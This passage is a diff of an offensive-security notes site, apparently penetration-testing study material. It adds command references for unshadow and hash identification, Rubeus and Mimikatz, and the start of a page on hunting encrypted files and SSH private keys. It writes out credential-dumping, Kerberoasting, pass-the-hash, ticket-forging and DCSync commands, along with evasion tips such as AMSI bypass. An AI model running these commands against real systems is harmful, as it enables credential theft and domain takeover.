+<pre><code>htb-student:$y$j9T$3QSBB6CbHEu...f8Ms:1000:1000:HTB Student,,,:/home/htb-student:/bin/bash
+</code></pre>
+<hr>
+<h2 id="why-use-unshadow"><a class="header" href="#why-use-unshadow">Why Use Unshadow?</a></h2>
+<ol>
+<li>
+<p><strong>Context for Single Crack Mode</strong> - John’s single crack mode leverages the username and GECOS data to generate intelligent password guesses (e.g., user “Bob Smith” might use “Smith1” as password)</p>
+</li>
+<li>
+<p><strong>Complete User Context</strong> - Having the full passwd line helps identify which accounts are worth targeting (system accounts vs. real users)</p>
+</li>
+<li>
+<p><strong>Standard Format</strong> - Creates the classic Unix password file format that many tools expect</p>
+</li>
+</ol>
+<hr>
+<h2 id="hash-algorithm-identification"><a class="header" href="#hash-algorithm-identification">Hash Algorithm Identification</a></h2>
+<p>The password hash in the unshadowed file indicates the algorithm:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Prefix</th><th>Algorithm</th><th>Hashcat Mode</th></tr>
+</thead>
+<tbody>
+<tr><td>$1$</td><td>MD5crypt</td><td>500</td></tr>
+<tr><td>$5$</td><td>SHA-256crypt</td><td>7400</td></tr>
+<tr><td>$6$</td><td>SHA-512crypt</td><td>1800</td></tr>
+<tr><td>$y$</td><td>Yescrypt</td><td>-</td></tr>
+<tr><td>$2a$</td><td>bcrypt</td><td>3200</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="security-notes"><a class="header" href="#security-notes">Security Notes</a></h2>
+<ul>
+<li>Requires root access to read <code>/etc/shadow</code></li>
+<li>Work with file copies, never modify originals</li>
+<li>Delete unshadowed files after use to avoid credential exposure</li>
+<li>MD5crypt ($1$) hashes are significantly faster to crack than modern algorithms</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="rubeus"><a class="header" href="#rubeus">Rubeus</a></h1>
+<p>Rubeus is a C# toolkit for Kerberos interaction and abuse, developed by Will Schroeder (harmj0y) as part of the GhostPack project. It provides extensive functionality for Kerberos ticket manipulation, credential extraction, and various Kerberos-based attacks.</p>
+<h2 id="key-capabilities-2"><a class="header" href="#key-capabilities-2">Key Capabilities</a></h2>
+<ul>
+<li><strong>Ticket Operations</strong>: Dump, request, renew, describe, and import Kerberos tickets</li>
+<li><strong>Pass the Ticket</strong>: Import tickets into the current session for lateral movement</li>
+<li><strong>Pass the Key / OverPass the Hash</strong>: Request TGTs using password hashes</li>
+<li><strong>Kerberoasting</strong>: Extract service ticket hashes for offline cracking</li>
+<li><strong>AS-REP Roasting</strong>: Extract hashes from accounts without pre-authentication</li>
+<li><strong>Constrained Delegation Abuse</strong>: S4U2Self and S4U2Proxy attacks</li>
+<li><strong>Ticket Forging</strong>: Create Golden and Silver tickets (with appropriate hashes)</li>
+</ul>
+<hr>
+<h2 id="installation-9"><a class="header" href="#installation-9">Installation</a></h2>
+<p>Rubeus is not installed via package managers. Compile from source or download pre-compiled:</p>
+<pre><code>https://github.com/GhostPack/Rubeus
+</code></pre>
+<p>Compile with Visual Studio or use pre-compiled versions from various pentesting resources.</p>
+<hr>
+<h2 id="basic-usage-5"><a class="header" href="#basic-usage-5">Basic Usage</a></h2>
+<h3 id="dump-all-tickets-1"><a class="header" href="#dump-all-tickets-1">Dump All Tickets</a></h3>
+<pre><code class="language-cmd">Rubeus.exe dump /nowrap
+</code></pre>
+<p>The <code>/nowrap</code> option prevents line wrapping in Base64 output for easier copy-paste.</p>
+<h3 id="triage-list-current-tickets"><a class="header" href="#triage-list-current-tickets">Triage (List Current Tickets)</a></h3>
+<pre><code class="language-cmd">Rubeus.exe triage
+</code></pre>
+<h3 id="request-a-tgt"><a class="header" href="#request-a-tgt">Request a TGT</a></h3>
+<p>Using NTLM hash (RC4):</p>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:john /domain:domain.local /rc4:64F12CDDAA88057E06A81B54E73B949B /nowrap
+</code></pre>
+<p>Using AES256 hash:</p>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:john /domain:domain.local /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
+</code></pre>
+<p>Using password:</p>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:john /domain:domain.local /password:Password123! /nowrap
+</code></pre>
+<h3 id="request-tgt-and-import-into-session"><a class="header" href="#request-tgt-and-import-into-session">Request TGT and Import into Session</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:john /domain:domain.local /aes256:&lt;hash&gt; /ptt
+</code></pre>
+<hr>
+<h2 id="pass-the-ticket-ptt-1"><a class="header" href="#pass-the-ticket-ptt-1">Pass the Ticket (PtT)</a></h2>
+<h3 id="import-kirbi-file-1"><a class="header" href="#import-kirbi-file-1">Import .kirbi File</a></h3>
+<pre><code class="language-cmd">Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-john@krbtgt-domain.local.kirbi
+</code></pre>
+<h3 id="import-base64-ticket-1"><a class="header" href="#import-base64-ticket-1">Import Base64 Ticket</a></h3>
+<pre><code class="language-cmd">Rubeus.exe ptt /ticket:doIFqDCCBaSgAwIBBaEDAgEWooIEoj...
+</code></pre>
+<p>After importing, access resources in the user’s context:</p>
+<pre><code class="language-cmd">dir \\DC01.domain.local\c$
+</code></pre>
+<hr>
+<h2 id="sacrificial-process-createnetonly-1"><a class="header" href="#sacrificial-process-createnetonly-1">Sacrificial Process (createnetonly)</a></h2>
+<p>Create a new logon session to avoid overwriting existing tickets:</p>
+<pre><code class="language-cmd">Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+</code></pre>
+<p>In the spawned window, request and import a ticket:</p>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:john /domain:domain.local /aes256:&lt;hash&gt; /ptt
+</code></pre>
+<p>Use PowerShell remoting to access the target:</p>
+<pre><code class="language-powershell">Enter-PSSession -ComputerName DC01
+</code></pre>
+<hr>
+<h2 id="kerberoasting-1"><a class="header" href="#kerberoasting-1">Kerberoasting</a></h2>
+<h3 id="extract-all-kerberoastable-hashes"><a class="header" href="#extract-all-kerberoastable-hashes">Extract All Kerberoastable Hashes</a></h3>
+<pre><code class="language-cmd">Rubeus.exe kerberoast /nowrap
+</code></pre>
+<h3 id="specific-user"><a class="header" href="#specific-user">Specific User</a></h3>
+<pre><code class="language-cmd">Rubeus.exe kerberoast /user:svc_mssql /nowrap
+</code></pre>
+<h3 id="hashcat-compatible-format"><a class="header" href="#hashcat-compatible-format">Hashcat-Compatible Format</a></h3>
+<pre><code class="language-cmd">Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast.txt
+</code></pre>
+<h3 id="request-aes-tickets-harder-to-crack"><a class="header" href="#request-aes-tickets-harder-to-crack">Request AES Tickets (Harder to Crack)</a></h3>
+<pre><code class="language-cmd">Rubeus.exe kerberoast /aes /nowrap
+</code></pre>
+<p>Crack with Hashcat:</p>
+<pre><code class="language-bash">hashcat -m 13100 kerberoast.txt wordlist.txt
+</code></pre>
+<hr>
+<h2 id="as-rep-roasting-1"><a class="header" href="#as-rep-roasting-1">AS-REP Roasting</a></h2>
+<p>Target accounts with “Do not require Kerberos preauthentication” enabled:</p>
+<h3 id="extract-all-as-rep-roastable-hashes"><a class="header" href="#extract-all-as-rep-roastable-hashes">Extract All AS-REP Roastable Hashes</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asreproast /nowrap
+</code></pre>
+<h3 id="specific-user-1"><a class="header" href="#specific-user-1">Specific User</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asreproast /user:svc_backup /nowrap
+</code></pre>
+<h3 id="hashcat-format"><a class="header" href="#hashcat-format">Hashcat Format</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+</code></pre>
+<p>Crack with Hashcat:</p>
+<pre><code class="language-bash">hashcat -m 18200 asrep.txt wordlist.txt
+</code></pre>
+<hr>
+<h2 id="request-service-tickets-asktgs-1"><a class="header" href="#request-service-tickets-asktgs-1">Request Service Tickets (asktgs)</a></h2>
+<p>Request a TGS using an existing TGT:</p>
+<pre><code class="language-cmd">Rubeus.exe asktgs /ticket:&lt;tgt_base64&gt; /service:cifs/fileserver.domain.local /nowrap
+</code></pre>
+<p>Request and import:</p>
+<pre><code class="language-cmd">Rubeus.exe asktgs /ticket:&lt;tgt_base64&gt; /service:cifs/fileserver.domain.local /ptt
+</code></pre>
+<hr>
+<h2 id="constrained-delegation-abuse-s4u"><a class="header" href="#constrained-delegation-abuse-s4u">Constrained Delegation Abuse (S4U)</a></h2>
+<p>When a service account has constrained delegation configured:</p>
+<pre><code class="language-cmd">Rubeus.exe s4u /user:svc_sql /rc4:&lt;hash&gt; /impersonateuser:Administrator /msdsspn:cifs/fileserver.domain.local /ptt
+</code></pre>
+<p>With alternate service:</p>
+<pre><code class="language-cmd">Rubeus.exe s4u /user:svc_sql /aes256:&lt;hash&gt; /impersonateuser:Administrator /msdsspn:cifs/fileserver.domain.local /altservice:http /ptt
+</code></pre>
+<hr>
+<h2 id="ticket-operations-2"><a class="header" href="#ticket-operations-2">Ticket Operations</a></h2>
+<h3 id="describe-a-ticket-1"><a class="header" href="#describe-a-ticket-1">Describe a Ticket</a></h3>
+<pre><code class="language-cmd">Rubeus.exe describe /ticket:&lt;base64_or_path&gt;
+</code></pre>
+<p>Shows ticket details including:</p>
+<ul>
+<li>Service name</li>
+<li>User name</li>
+<li>Start/End times</li>
+<li>Flags</li>
+<li>Encryption type</li>
+</ul>
+<h3 id="renew-a-tgt-1"><a class="header" href="#renew-a-tgt-1">Renew a TGT</a></h3>
+<pre><code class="language-cmd">Rubeus.exe renew /ticket:&lt;base64_or_path&gt; /nowrap
+</code></pre>
+<h3 id="purge-all-tickets"><a class="header" href="#purge-all-tickets">Purge All Tickets</a></h3>
+<pre><code class="language-cmd">Rubeus.exe purge
+</code></pre>
+<h3 id="purge-specific-luid"><a class="header" href="#purge-specific-luid">Purge Specific LUID</a></h3>
+<pre><code class="language-cmd">Rubeus.exe purge /luid:0x6c680
+</code></pre>
+<hr>
+<h2 id="hash-calculation-1"><a class="header" href="#hash-calculation-1">Hash Calculation</a></h2>
+<p>Calculate Kerberos hashes from a plaintext password:</p>
+<pre><code class="language-cmd">Rubeus.exe hash /user:john /domain:domain.local /password:Password123!
+</code></pre>
+<p>Output:</p>
+<pre><code>rc4_hmac             : 64F12CDDAA88057E06A81B54E73B949B
+aes128_cts_hmac_sha1 : 9e5f1e63b7b3e8f...
+aes256_cts_hmac_sha1 : b21c99fc068e3ab...
+des_cbc_md5          : ...
+</code></pre>
+<hr>
+<h2 id="monitoring-for-tickets"><a class="header" href="#monitoring-for-tickets">Monitoring for Tickets</a></h2>
+<p>Monitor for new TGTs (useful during lateral movement):</p>
+<pre><code class="language-cmd">Rubeus.exe monitor /interval:5
+</code></pre>
+<p>Filter for specific user:</p>
+<pre><code class="language-cmd">Rubeus.exe monitor /interval:5 /filteruser:Administrator
+</code></pre>
+<hr>
+<h2 id="common-options-7"><a class="header" href="#common-options-7">Common Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>/nowrap</code></td><td>Don’t wrap Base64 output</td></tr>
+<tr><td><code>/ptt</code></td><td>Import ticket into current session</td></tr>
+<tr><td><code>/dc:&lt;ip&gt;</code></td><td>Specify domain controller</td></tr>
+<tr><td><code>/domain:&lt;domain&gt;</code></td><td>Specify domain name</td></tr>
+<tr><td><code>/user:&lt;user&gt;</code></td><td>Specify username</td></tr>
+<tr><td><code>/outfile:&lt;path&gt;</code></td><td>Save output to file</td></tr>
+<tr><td><code>/luid:&lt;luid&gt;</code></td><td>Target specific logon session</td></tr>
+<tr><td><code>/format:hashcat</code></td><td>Output in Hashcat-compatible format</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="powershell-helpers"><a class="header" href="#powershell-helpers">PowerShell Helpers</a></h2>
+<h3 id="convert-kirbi-to-base64"><a class="header" href="#convert-kirbi-to-base64">Convert .kirbi to Base64</a></h3>
+<pre><code class="language-powershell">[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
+</code></pre>
+<h3 id="convert-base64-to-kirbi"><a class="header" href="#convert-base64-to-kirbi">Convert Base64 to .kirbi</a></h3>
+<pre><code class="language-powershell">[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("&lt;base64&gt;"))
+</code></pre>
+<hr>
+<h2 id="detection-and-evasion"><a class="header" href="#detection-and-evasion">Detection and Evasion</a></h2>
+<h3 id="common-detection-points"><a class="header" href="#common-detection-points">Common Detection Points</a></h3>
+<ul>
+<li>Unusual Kerberos ticket requests (Event ID 4768, 4769)</li>
+<li>Service ticket requests for sensitive SPNs</li>
+<li>AS-REQ without pre-authentication</li>
+<li>High volume of TGS requests (Kerberoasting)</li>
+</ul>
+<h3 id="evasion-techniques-1"><a class="header" href="#evasion-techniques-1">Evasion Techniques</a></h3>
+<ul>
+<li>Use AES encryption instead of RC4 (less suspicious)</li>
+<li>Use <code>/opsec</code> flag for reduced detection footprint</li>
+<li>Limit ticket requests to avoid anomaly detection</li>
+<li>Use sacrificial processes to isolate activity</li>
+</ul>
+<hr>
+<h2 id="related-tools-5"><a class="header" href="#related-tools-5">Related Tools</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td>Mimikatz</td><td>Windows credential extraction and ticket manipulation</td></tr>
+<tr><td>Impacket</td><td>Python toolkit with GetTGT, GetST, GetUserSPNs</td></tr>
+<tr><td>Kekeo</td><td>Advanced Kerberos toolkit by gentilkiwi</td></tr>
+<tr><td>PowerView</td><td>PowerShell AD enumeration</td></tr>
+<tr><td>BloodHound</td><td>AD attack path mapping</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="core-takeaways-7"><a class="header" href="#core-takeaways-7">Core Takeaways</a></h2>
+<ul>
+<li>Use <code>/nowrap</code> for Base64 output to simplify copy-paste</li>
+<li><code>asktgt</code> with <code>/ptt</code> is the quickest way to request and use a ticket</li>
+<li><code>createnetonly</code> prevents overwriting your current session’s tickets</li>
+<li>Kerberoasting and AS-REP roasting are key techniques for credential extraction</li>
+<li>S4U attacks enable impersonation when constrained delegation is configured</li>
+<li>AES256 is preferred over RC4 for both security and stealth</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="mimikatz"><a class="header" href="#mimikatz">Mimikatz</a></h1>
+<p>Mimikatz is a Windows post-exploitation tool developed by Benjamin Delpy that extracts credentials, hashes, PINs, and Kerberos tickets from memory. It is one of the most widely used tools for credential theft and lateral movement in Windows environments.</p>
+<h2 id="key-capabilities-3"><a class="header" href="#key-capabilities-3">Key Capabilities</a></h2>
+<ul>
+<li><strong>Credential Extraction</strong>: Dump plaintext passwords, hashes, and Kerberos tickets from LSASS memory</li>
+<li><strong>Pass-the-Hash/Pass-the-Ticket</strong>: Use extracted credentials for lateral movement</li>
+<li><strong>DPAPI Attacks</strong>: Decrypt Windows Data Protection API protected secrets</li>
+<li><strong>Golden/Silver Tickets</strong>: Forge Kerberos tickets for persistence</li>
+<li><strong>DCSync</strong>: Replicate credentials from Domain Controllers</li>
+</ul>
+<hr>
+<h2 id="installation-10"><a class="header" href="#installation-10">Installation</a></h2>
+<p>Mimikatz is not installed via package managers. Download from the official repository:</p>
+<pre><code>https://github.com/gentilkiwi/mimikatz/releases
+</code></pre>
+<p>For evasion, consider using:</p>
+<ul>
+<li><strong>Invoke-Mimikatz</strong>: PowerShell version</li>
+<li><strong>pypykatz</strong>: Python implementation (cross-platform)</li>
+</ul>
+<hr>
+<h2 id="basic-usage-6"><a class="header" href="#basic-usage-6">Basic Usage</a></h2>
+<h3 id="enable-debug-privileges"><a class="header" href="#enable-debug-privileges">Enable Debug Privileges</a></h3>
+<pre><code>privilege::debug
+</code></pre>
+<p>Required for accessing LSASS memory. Returns <code>Privilege '20' OK</code> on success.</p>
+<h3 id="dump-all-credentials-from-lsass"><a class="header" href="#dump-all-credentials-from-lsass">Dump All Credentials from LSASS</a></h3>
+<pre><code>sekurlsa::logonpasswords
+</code></pre>
+<h3 id="dump-credential-manager-secrets"><a class="header" href="#dump-credential-manager-secrets">Dump Credential Manager Secrets</a></h3>
+<pre><code>sekurlsa::credman
+</code></pre>
+<h3 id="export-kerberos-tickets"><a class="header" href="#export-kerberos-tickets">Export Kerberos Tickets</a></h3>
+<pre><code>sekurlsa::tickets /export
+</code></pre>
+<hr>
+<h2 id="common-modules"><a class="header" href="#common-modules">Common Modules</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Module</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><code>sekurlsa</code></td><td>Extract credentials from LSASS memory</td></tr>
+<tr><td><code>lsadump</code></td><td>Dump LSA secrets, SAM database, DCSync</td></tr>
+<tr><td><code>kerberos</code></td><td>Kerberos ticket operations</td></tr>
+<tr><td><code>vault</code></td><td>Windows Vault/Credential Manager</td></tr>
+<tr><td><code>dpapi</code></td><td>DPAPI masterkey and blob decryption</td></tr>
+<tr><td><code>crypto</code></td><td>Certificate and key operations</td></tr>
+<tr><td><code>token</code></td><td>Token manipulation</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="sekurlsa-module-1"><a class="header" href="#sekurlsa-module-1">sekurlsa Module</a></h2>
+<h3 id="dump-logon-passwords"><a class="header" href="#dump-logon-passwords">Dump Logon Passwords</a></h3>
+<pre><code>sekurlsa::logonpasswords
+</code></pre>
+<h3 id="dump-credential-manager"><a class="header" href="#dump-credential-manager">Dump Credential Manager</a></h3>
+<pre><code>sekurlsa::credman
+</code></pre>
+<h3 id="dump-dpapi-masterkeys"><a class="header" href="#dump-dpapi-masterkeys">Dump DPAPI Masterkeys</a></h3>
+<pre><code>sekurlsa::dpapi
+</code></pre>
+<h3 id="dump-kerberos-tickets"><a class="header" href="#dump-kerberos-tickets">Dump Kerberos Tickets</a></h3>
+<pre><code>sekurlsa::tickets
+</code></pre>
+<h3 id="pass-the-hash-2"><a class="header" href="#pass-the-hash-2">Pass-the-Hash</a></h3>
+<pre><code>sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:&lt;hash&gt; /run:cmd
+</code></pre>
+<h3 id="dump-kerberos-encryption-keys"><a class="header" href="#dump-kerberos-encryption-keys">Dump Kerberos Encryption Keys</a></h3>
+<pre><code>sekurlsa::ekeys
+</code></pre>
+<p>Extracts AES256, AES128, and RC4 keys for Kerberos authentication. Useful for Pass the Key / OverPass the Hash attacks.</p>
+<h3 id="pass-the-key--overpass-the-hash"><a class="header" href="#pass-the-key--overpass-the-hash">Pass the Key / OverPass the Hash</a></h3>
+<pre><code>sekurlsa::pth /user:Administrator /domain:DOMAIN /aes256:&lt;aes256_hash&gt; /run:cmd
+</code></pre>
+<p>Converts a Kerberos key (AES256, AES128, or RC4) into a full TGT. The spawned process can then request service tickets for lateral movement.</p>
+<hr>
+<h2 id="lsadump-module-1"><a class="header" href="#lsadump-module-1">lsadump Module</a></h2>
+<h3 id="dump-sam-database-1"><a class="header" href="#dump-sam-database-1">Dump SAM Database</a></h3>
+<pre><code>lsadump::sam
+</code></pre>
+<h3 id="dump-lsa-secrets-1"><a class="header" href="#dump-lsa-secrets-1">Dump LSA Secrets</a></h3>
+<pre><code>lsadump::secrets
+</code></pre>
+<h3 id="dump-cached-domain-credentials-1"><a class="header" href="#dump-cached-domain-credentials-1">Dump Cached Domain Credentials</a></h3>
+<pre><code>lsadump::cache
+</code></pre>
+<h3 id="dcsync-requires-domain-admin-or-replication-rights"><a class="header" href="#dcsync-requires-domain-admin-or-replication-rights">DCSync (requires Domain Admin or replication rights)</a></h3>
+<pre><code>lsadump::dcsync /domain:domain.local /user:Administrator
+lsadump::dcsync /domain:domain.local /all /csv
+</code></pre>
+<hr>
+<h2 id="kerberos-attacks-1"><a class="header" href="#kerberos-attacks-1">Kerberos Attacks</a></h2>
+<h3 id="golden-ticket-requires-krbtgt-hash"><a class="header" href="#golden-ticket-requires-krbtgt-hash">Golden Ticket (requires krbtgt hash)</a></h3>
+<pre><code>kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:&lt;hash&gt; /ptt
+</code></pre>
+<h3 id="silver-ticket-requires-service-account-hash"><a class="header" href="#silver-ticket-requires-service-account-hash">Silver Ticket (requires service account hash)</a></h3>
+<pre><code>kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:&lt;hash&gt; /ptt
+</code></pre>
+<h3 id="pass-the-ticket"><a class="header" href="#pass-the-ticket">Pass-the-Ticket</a></h3>
+<pre><code>kerberos::ptt &lt;ticket.kirbi&gt;
+</code></pre>
+<h3 id="list-tickets"><a class="header" href="#list-tickets">List Tickets</a></h3>
+<pre><code>kerberos::list
+</code></pre>
+<h3 id="purge-tickets"><a class="header" href="#purge-tickets">Purge Tickets</a></h3>
+<pre><code>kerberos::purge
+</code></pre>
+<hr>
+<h2 id="dpapi-attacks"><a class="header" href="#dpapi-attacks">DPAPI Attacks</a></h2>
+<h3 id="list-vault-credentials-1"><a class="header" href="#list-vault-credentials-1">List Vault Credentials</a></h3>
+<pre><code>vault::list
+vault::cred
+</code></pre>
+<h3 id="decrypt-dpapi-blob"><a class="header" href="#decrypt-dpapi-blob">Decrypt DPAPI Blob</a></h3>
+<pre><code>dpapi::blob /in:&lt;blob_file&gt; /masterkey:&lt;key&gt;
+</code></pre>
+<h3 id="decrypt-credential-file-1"><a class="header" href="#decrypt-credential-file-1">Decrypt Credential File</a></h3>
+<pre><code>dpapi::cred /in:&lt;credential_file&gt;
+</code></pre>
+<h3 id="extract-masterkey-with-rpc-to-dc"><a class="header" href="#extract-masterkey-with-rpc-to-dc">Extract Masterkey (with RPC to DC)</a></h3>
+<pre><code>dpapi::masterkey /in:&lt;masterkey_file&gt; /rpc
+</code></pre>
+<hr>
+<h2 id="offline-attacks"><a class="header" href="#offline-attacks">Offline Attacks</a></h2>
+<h3 id="dump-sam-from-registry-hives"><a class="header" href="#dump-sam-from-registry-hives">Dump SAM from Registry Hives</a></h3>
+<pre><code>lsadump::sam /sam:sam.hive /system:system.hive
+</code></pre>
+<h3 id="dump-secrets-from-registry-hives"><a class="header" href="#dump-secrets-from-registry-hives">Dump Secrets from Registry Hives</a></h3>
+<pre><code>lsadump::secrets /system:system.hive /security:security.hive
+</code></pre>
+<hr>
+<h2 id="one-liner-examples"><a class="header" href="#one-liner-examples">One-Liner Examples</a></h2>
+<h3 id="full-credential-dump-2"><a class="header" href="#full-credential-dump-2">Full Credential Dump</a></h3>
+<pre><code>mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+</code></pre>
+<h3 id="dcsync-single-user"><a class="header" href="#dcsync-single-user">DCSync Single User</a></h3>
+<pre><code>mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /user:krbtgt" "exit"
+</code></pre>
+<h3 id="export-all-kerberos-tickets-1"><a class="header" href="#export-all-kerberos-tickets-1">Export All Kerberos Tickets</a></h3>
+<pre><code>mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
+</code></pre>
+<hr>
+<h2 id="detection-and-evasion-1"><a class="header" href="#detection-and-evasion-1">Detection and Evasion</a></h2>
+<h3 id="common-detection-points-1"><a class="header" href="#common-detection-points-1">Common Detection Points</a></h3>
+<ul>
+<li>LSASS memory access</li>
+<li>Suspicious process creation</li>
+<li>Event ID 4624 (logon) with unusual patterns</li>
+<li>Sysmon Event ID 10 (process access to LSASS)</li>
+</ul>
+<h3 id="evasion-techniques-2"><a class="header" href="#evasion-techniques-2">Evasion Techniques</a></h3>
+<ul>
+<li>Use <code>pypykatz</code> for offline analysis</li>
+<li>Memory dump LSASS with <code>procdump</code>, analyze offline</li>
+<li>Use <code>Invoke-Mimikatz</code> with AMSI bypass</li>
+<li>Obfuscated/custom-compiled versions</li>
+</ul>
+<hr>
+<h2 id="related-tools-6"><a class="header" href="#related-tools-6">Related Tools</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td>pypykatz</td><td>Python implementation (cross-platform)</td></tr>
+<tr><td>SharpKatz</td><td>C# implementation</td></tr>
+<tr><td>Rubeus</td><td>C# Kerberos toolkit</td></tr>
+<tr><td>Impacket</td><td>Python toolkit with secretsdump.py</td></tr>
+<tr><td>LaZagne</td><td>Multi-platform credential recovery</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="core-takeaways-8"><a class="header" href="#core-takeaways-8">Core Takeaways</a></h2>
+<ul>
+<li>Always run <code>privilege::debug</code> first to enable LSASS access</li>
+<li><code>sekurlsa::logonpasswords</code> is the go-to command for credential extraction</li>
+<li>DCSync requires Domain Admin or specific replication rights</li>
+<li>Kerberos attacks (Golden/Silver tickets) provide powerful persistence</li>
+<li>DPAPI attacks can recover Credential Manager, browser, and application secrets</li>
+<li>Consider offline analysis to avoid detection</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="troubleshooting-2"><a class="header" href="#troubleshooting-2">Troubleshooting</a></h1>
 <h2 id="directory-map-29"><a class="header" href="#directory-map-29">Directory Map</a></h2>
 <ul>
 <li><a href="troubleshooting/linux">linux</a></li>
@@ -28012,8 +29329,8 @@ ac
 <ul>
 <li><a href="#cve-common-vulnerabilities-and-exposures">cve</a></li>
 <li><a href="#cvss-common-vulnerability-scoring-system">cvss</a></li>
-<li><a href="#nessus">nessus</a></li>
-<li><a href="#openvas">openvas</a></li>
+<li><a href="infosec/vulnerabilities/nessus.html">nessus</a></li>
+<li><a href="infosec/vulnerabilities/openvas.html">openvas</a></li>
 </ul>
 <h3 id="file-transfers"><a class="header" href="#file-transfers">File Transfers</a></h3>
 <ul>
@@ -28025,12 +29342,295 @@ ac
 <li><a href="#windows-authentication-process">windows-auth</a></li>
 <li><a href="#attacking-active-directory">ADDS</a></li>
 <li><a href="#attacking-windows-credential-manager">credential manager</a></li>
-<li><a href="infosec/windows/pass-the-hash.html">pass-the-hash</a></li>
+<li><a href="#pass-the-hash-pth-attacks">pass-the-hash</a></li>
 </ul>
 <h3 id="linux-1"><a class="header" href="#linux-1">Linux</a></h3>
 <ul>
 <li><a href="#linux-authentication">linux-auth</a></li>
 </ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="cracking-protected-files-and-archives"><a class="header" href="#cracking-protected-files-and-archives">Cracking Protected Files and Archives</a></h1>
+<p>The use of file encryption is often neglected in both private and professional contexts. Even today, emails containing job applications, account statements, or contracts are frequently sent without encryption—sometimes in violation of legal regulations. For example, within the European Union, the General Data Protection Regulation (GDPR) requires that personal data be encrypted both in transit and at rest. Nevertheless, it remains standard practice to discuss confidential topics or transmit sensitive data via email, which may be intercepted by attackers positioned to exploit these communication channels.</p>
+<p>As more companies enhance their IT security infrastructure through training programs and security awareness seminars, it is becoming increasingly common for employees to encrypt sensitive files. Nevertheless, encrypted files can still be cracked and accessed with the right combination of wordlists and tools.</p>
+<h2 id="encryption-methods"><a class="header" href="#encryption-methods">Encryption Methods</a></h2>
+<p>In many cases, symmetric encryption algorithms such as AES-256 are used to securely store individual files or folders. In this method, the same key is used for both encryption and decryption.</p>
+<p>For transmitting files, asymmetric encryption is typically employed, which uses two distinct keys: the sender encrypts the file with the recipient’s public key, and the recipient decrypts it using the corresponding private key.</p>
+<hr>
+<h2 id="hunting-for-encrypted-files-3"><a class="header" href="#hunting-for-encrypted-files-3">Hunting for Encrypted Files</a></h2>
+<p>Many different extensions correspond to encrypted files—a useful reference list can be found on <a href="https://fileinfo.com/filetypes/encrypted">FileInfo</a>.</p>
+<h3 id="find-common-encrypted-file-types-1"><a class="header" href="#find-common-encrypted-file-types-1">Find Common Encrypted File Types</a></h3>
+<pre><code class="language-bash">for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*"); do
+  echo -e "\nFile extension: " $ext
+  find / -name *$ext 2&gt;/dev/null | grep -v "lib\|fonts\|share\|core"
+done
+</code></pre>
+<p>Example output:</p>
+<pre><code>File extension:  .od*
+/home/cry0l1t3/Docs/document-temp.odt
+/home/cry0l1t3/Docs/product-improvements.odp
+/home/cry0l1t3/Docs/mgmt-spreadsheet.ods
+</code></pre>
+<p>If you encounter unfamiliar file extensions, use search engines to research the technology behind them.</p>
+<hr>
+<h2 id="hunting-for-ssh-keys-2"><a class="header" href="#hunting-for-ssh-keys-2">Hunting for SSH Keys</a></h2>
+<p>SSH keys do not have standard file extensions. They can be identified by their header and footer values. SSH private keys always begin with <code>-----BEGIN [...] PRIVATE KEY-----</code>.</p>
+<h3 id="find-ssh-private-keys-1"><a class="header" href="#find-ssh-private-keys-1">Find SSH Private Keys</a></h3>
+<pre><code class="language-bash">grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2&gt;/dev/null
+</code></pre>
+<p>Example output:</p>
+<pre><code>/home/jsmith/.ssh/id_ed25519:1:-----BEGIN OPENSSH PRIVATE KEY-----
+/home/jsmith/.ssh/SSH.private:1:-----BEGIN RSA PRIVATE KEY-----
+/home/jsmith/Documents/id_rsa:1:-----BEGIN OPENSSH PRIVATE KEY-----
+</code></pre>
+<h3 id="identifying-encrypted-ssh-keys"><a class="header" href="#identifying-encrypted-ssh-keys">Identifying Encrypted SSH Keys</a></h3>
+<p>Some SSH keys are encrypted with a passphrase. With older PEM formats, encryption is visible in the header:</p>
